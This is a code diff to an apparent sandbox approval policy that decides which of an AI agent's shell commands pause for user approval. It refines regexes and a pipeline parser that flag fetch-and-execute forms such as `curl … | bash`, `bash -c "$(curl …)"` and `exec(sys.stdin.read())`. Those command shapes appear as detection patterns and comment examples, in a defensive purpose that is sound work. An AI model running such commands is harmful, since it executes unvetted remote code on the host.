@@ -13,7 +13,10 @@ const path = require('path')
 //                 pushing the base branch, deployments and destructive system operations
 //                 still pause.
 //
-// Regardless of level, downloading and executing a remote script always pauses.
+// Regardless of level, downloading and executing a remote script always pauses - that means the
+// fetched bytes actually becoming the running program (`curl … | bash`, `bash -c "$(curl …)"`),
+// not merely piping a fetch into a tool. Piping a download into an interpreter that was given its
+// own inline program (`curl … | python3 -c '…'`) is data handling and follows the level.
 //
 // Deployment note: this module does NOT run in the Firebase Functions runtime. It is copied
 // verbatim into the sandbox as `approval-policy.cjs` by `prepareVmAgentBridge` and evaluated in
@@ -56,8 +59,50 @@ const SENSITIVE_COMMAND_PATH_PATTERN =
 // Fetch-and-execute in a single pipeline. Previously auto-approved: the old policy only looked
 // for HTTP *mutation* flags, so `curl -fsSL https://x/y.sh | bash` - remote code execution -
 // passed while reading your own Cloud Logging paused. Always escalates, at every level.
+//
+// AT-2235: matching the *shape* `curl … | <interpreter>` was too blunt. What makes this remote
+// code execution is that the fetched bytes become the program. When the interpreter is handed its
+// own inline program (`python3 -c …`, `node -e …`, `jq`-style filtering, `bash -c …`) or a local
+// script file, the downloaded bytes are ordinary stdin *data* and nothing remote is executed - yet
+// `curl "…/pipelines/123" | python3 -c "import json,sys; print(json.load(sys.stdin)['status'])"`
+// escalated on a `permissive` run, which cannot be overridden because this rule always escalates.
+// Detection is therefore structural (`detectRemoteScriptExecution`): a pipeline segment counts
+// only when the interpreter would actually read its program from stdin. The pattern below is kept
+// as the cheap pre-filter for the pipe shape, and the structural pass decides.
 const REMOTE_EXECUTION_PATTERN =
-    /\b(?:curl|wget)\b[^|;&\n]*\|\s*(?:sudo\s+)?(?:bash|sh|zsh|fish|dash|ksh|python[0-9.]*|node|perl|ruby|php)\b/i
+    /\b(?:curl|wget)\b[^;&\n]*\|\s*[^|;&\n]*\b(?:bash|sh|zsh|fish|dash|ksh|ash|python[0-9.]*|node|nodejs|bun|deno|perl|ruby|php)\b/i
+
+// Command/process substitution feeding an interpreter - `bash -c "$(curl …)"`, `eval $(curl …)`,
+// `bash <(curl …)`, `source /dev/stdin`. Real remote code execution with no pipe in sight, so the
+// old pipe-only pattern never saw it. Escalates at every level, like the pipe form.
+const REMOTE_SUBSTITUTION_PATTERN = /(?:\$\(|<\(|`)\s*(?:sudo\s+)?(?:curl|wget)\b/i
+
+// Interpreters that execute their standard input as a program when they are not given one.
+const INTERPRETER_FAMILY_PATTERNS = [
+    [/^(?:bash|sh|zsh|fish|dash|ksh|ash)$/i, 'shell'],
+    [/^python[0-9.]*$/i, 'python'],
+    [/^(?:node|nodejs|bun|deno)$/i, 'node'],
+    [/^perl[0-9.]*$/i, 'perl'],
+    [/^ruby[0-9.]*$/i, 'ruby'],
+    [/^php[0-9.]*$/i, 'php'],
+]
+
+// Flags that supply the program inline, i.e. the fetched bytes are data, not code.
+const INTERPRETER_INLINE_CODE_FLAGS = {
+    shell: ['-c'],
+    python: ['-c', '-m'],
+    node: ['-e', '--eval', '-p', '--print'],
+    perl: ['-e', '-E'],
+    ruby: ['-e'],
+    php: ['-r'],
+}
+
+// An inline program can still hand stdin to an evaluator (`python3 -c 'exec(sys.stdin.read())'`,
+// `bash -c 'source /dev/stdin'`). That is fetch-and-execute again, so it keeps escalating.
+const INLINE_CODE_EVALUATES_STDIN_PATTERN =
+    /\b(?:eval|exec|execfile|system|source|compile|Function)\b[^\n]{0,160}?(?:\bstdin\b|\/dev\/stdin|\bcat\b|<&\s*0)|(?:^|[\s;&(])\.\s+\/dev\/stdin\b/i
+
+const REMOTE_FETCH_PATTERN = /\b(?:curl|wget)\b/i
 
 // Read-shaped HTTPS endpoints that must be called with POST + a request body. These are the
 // reason the original policy was so noisy: Alldone's own VM prompt instructs the agent to read
@@ -116,14 +161,23 @@ const RISKY_COMMAND_RULES = [
 // Git operations that rewrite or discard history.
 const DESTRUCTIVE_GIT_PATTERN = /\bgit\s+(?:reset\s+--hard\b|clean\s+-[a-z]*f|branch\s+-D\b|filter-branch\b)/i
 
-function splitCommandSegments(command) {
-    // Split on shell separators while keeping quoted sections intact. This is deliberately
-    // approximate: it exists so that a risky-looking token inside an unrelated argument cannot
-    // condemn the whole command line. The old policy matched raw substrings over the entire
-    // command, so a diagnostic like `node -e "...git push..."` was escalated as a publish.
+function splitCommandPipeline(command) {
+    // Split on shell separators while keeping quoted sections intact, remembering which separator
+    // introduced each segment. This is deliberately approximate: it exists so that a risky-looking
+    // token inside an unrelated argument cannot condemn the whole command line (the old policy
+    // matched raw substrings over the entire command, so a diagnostic like `node -e "...git
+    // push..."` was escalated as a publish), and so that a real pipe - the only separator that
+    // makes one command's output another's input - can be told apart from `;`, `&&` and `||`.
     const segments = []
     let current = ''
+    let separatorBefore = ''
     let quote = null
+    const push = separatorAfter => {
+        const text = current.trim()
+        if (text) segments.push({ text, separatorBefore })
+        current = ''
+        separatorBefore = separatorAfter
+    }
     for (let i = 0; i < command.length; i += 1) {
         const char = command[i]
         if (quote) {
@@ -136,15 +190,24 @@ function splitCommandSegments(command) {
             current += char
             continue
         }
-        if (char === ';' || char === '\n' || char === '|' || char === '&') {
-            segments.push(current)
-            current = ''
+        if (char === '|' || char === '&') {
+            const doubled = command[i + 1] === char
+            push(doubled ? `${char}${char}` : char)
+            if (doubled) i += 1
+            continue
+        }
+        if (char === ';' || char === '\n') {
+            push(char)
             continue
         }
         current += char
     }
-    segments.push(current)
-    return segments.map(segment => segment.trim()).filter(Boolean)
+    push('')
+    return segments
+}
+
+function splitCommandSegments(command) {
+    return splitCommandPipeline(command).map(segment => segment.text)
 }
 
 function tokenize(segment) {
@@ -167,6 +230,103 @@ function normalizeBranchRef(ref) {
         .pop()
         .replace(/^refs\/heads\//, '')
         .trim()
+}
+
+// `sudo bash` is still `bash`, and it must be recognised as remote execution rather than fall
+// through to the (allowlistable) elevated-shell rule.
+function stripPrivilegePrefix(tokens) {
+    let index = 0
+    while (['sudo', 'command', 'nohup', 'exec', 'stdbuf'].includes(path.basename(tokens[index] || ''))) {
+        index += 1
+        while (index < tokens.length && tokens[index].startsWith('-')) index += 1
+    }
+    return tokens.slice(index)
+}
+
+function interpreterFamily(program) {
+    const match = INTERPRETER_FAMILY_PATTERNS.find(([pattern]) => pattern.test(program))
+    return match ? match[1] : null
+}
+
+/**
+ * Would this interpreter invocation read the program it runs from standard input?
+ *
+ * `python3 -c "..."`, `python3 -m json.tool`, `node -e "..."`, `bash -c "..."` and `bash script.sh`
+ * all run a program that is already on the machine; anything arriving on stdin is data. A bare
+ * `python3`/`bash`/`node`, or an explicit stdin operand (`-`, `bash -s`), executes stdin itself.
+ */
+function interpreterExecutesStdin(tokens, segment) {
+    const family = interpreterFamily(path.basename(tokens[0] || ''))
+    if (!family) return false
+
+    const inlineFlags = INTERPRETER_INLINE_CODE_FLAGS[family] || []
+    let hasInlineCode = false
+    let hasScriptOperand = false
+    let readsStdinExplicitly = false
+
+    const args = tokens.slice(1)
+    for (let i = 0; i < args.length; i += 1) {
+        const arg = args[i]
+        if (arg === '-' || arg === '/dev/stdin') {
+            readsStdinExplicitly = true
+            continue
+        }
+        // `bash -s`, `sh -es` - "read the script from standard input".
+        if (family === 'shell' && /^-[a-z]*s[a-z]*$/.test(arg)) {
+            readsStdinExplicitly = true
+            continue
+        }
+        const exactFlag = inlineFlags.includes(arg)
+        if (exactFlag) {
+            hasInlineCode = true
+            i += 1 // the program text is the next token
+            continue
+        }
+        if (inlineFlags.some(flag => arg.startsWith(`${flag}=`))) {
+            hasInlineCode = true
+            continue
+        }
+        // Short flag with the code attached, e.g. `-e'console.log(1)'`.
+        if (inlineFlags.some(flag => flag.length === 2 && arg.length > 2 && arg.startsWith(flag))) {
+            hasInlineCode = true
+            continue
+        }
+        if (arg.startsWith('-')) continue
+        hasScriptOperand = true
+    }
+
+    if (readsStdinExplicitly) return true
+    if (hasInlineCode && INLINE_CODE_EVALUATES_STDIN_PATTERN.test(segment)) return true
+    return !hasInlineCode && !hasScriptOperand
+}
+
+function isInterpreterInvocation(tokens) {
+    const program = path.basename(tokens[0] || '')
+    return interpreterFamily(program) !== null || program === 'eval' || program === 'source' || program === '.'
+}
+
+/**
+ * Fetch-and-execute detection: remote bytes that become the running program.
+ *
+ * Walks the pipeline so that "output of a fetch" can be followed through pass-through stages
+ * (`curl … | tee /tmp/x | bash`), and resets at separators that are not pipes (`curl … || bash`
+ * runs a local shell, it does not execute the download).
+ */
+function detectRemoteScriptExecution(command) {
+    if (!REMOTE_EXECUTION_PATTERN.test(command) && !REMOTE_SUBSTITUTION_PATTERN.test(command)) return false
+
+    let carriesRemoteContent = false
+    for (const { text, separatorBefore } of splitCommandPipeline(command)) {
+        const tokens = stripPrivilegePrefix(stripEnvPrefix(tokenize(text)))
+        if (tokens.length === 0) continue
+        const pipedIn = separatorBefore === '|' && carriesRemoteContent
+
+        if (pipedIn && interpreterExecutesStdin(tokens, text)) return true
+        if (isInterpreterInvocation(tokens) && REMOTE_SUBSTITUTION_PATTERN.test(text)) return true
+
+        carriesRemoteContent = (separatorBefore === '|' && carriesRemoteContent) || REMOTE_FETCH_PATTERN.test(text)
+    }
+    return false
 }
 
 function analyzeGitPush(tokens, context) {
@@ -267,7 +427,7 @@ function assessBashCommand(command, context) {
     if (SENSITIVE_PATH_PATTERN.test(normalizedCommand) || SENSITIVE_COMMAND_PATH_PATTERN.test(normalizedCommand)) {
         return { autoApprove: false, reason: 'access to credentials or secret files', signature: 'bash:secrets' }
     }
-    if (REMOTE_EXECUTION_PATTERN.test(command)) {
+    if (detectRemoteScriptExecution(command)) {
         return {
             autoApprove: false,
             reason: 'downloading and executing a remote script',
@@ -431,9 +591,16 @@ function assessClaudeToolApproval(toolName, toolInput = {}, cwdOrOptions = '/hom
 
     if (verdict.autoApprove) return { autoApprove: true, reason: verdict.reason }
 
+    // An operation that must always pause reports an EMPTY signature, which is the contract the
+    // bridge and the host UI use to hide the "Allow for this run" button. Reporting a real
+    // signature here offered the user a button that the allowlist check below then refuses to
+    // honour: production job 8f3e8457 ended up with `bash:remote_execution` sitting in its
+    // `approvalAllowlist` while the very same operation kept pausing (AT-2235).
+    if (verdict.alwaysEscalate) return { autoApprove: false, reason: verdict.reason, signature: '' }
+
     // "Allow for this run": the user already approved this shape of operation earlier in the
-    // same VM job. Never honoured for always-escalate operations such as remote code execution.
-    if (!verdict.alwaysEscalate && verdict.signature && context.sessionAllowlist.includes(verdict.signature)) {
+    // same VM job.
+    if (verdict.signature && context.sessionAllowlist.includes(verdict.signature)) {
         return { autoApprove: true, reason: 'approved by the user earlier in this run' }
     }
 
@@ -449,8 +616,12 @@ module.exports = {
     SENSITIVE_COMMAND_PATH_PATTERN,
     RISKY_COMMAND_RULES,
     REMOTE_EXECUTION_PATTERN,
+    REMOTE_SUBSTITUTION_PATTERN,
     READ_ONLY_ENDPOINT_PATTERNS,
     assessClaudeToolApproval,
+    detectRemoteScriptExecution,
+    interpreterExecutesStdin,
     isPathWithin,
     splitCommandSegments,
+    splitCommandPipeline,
 }
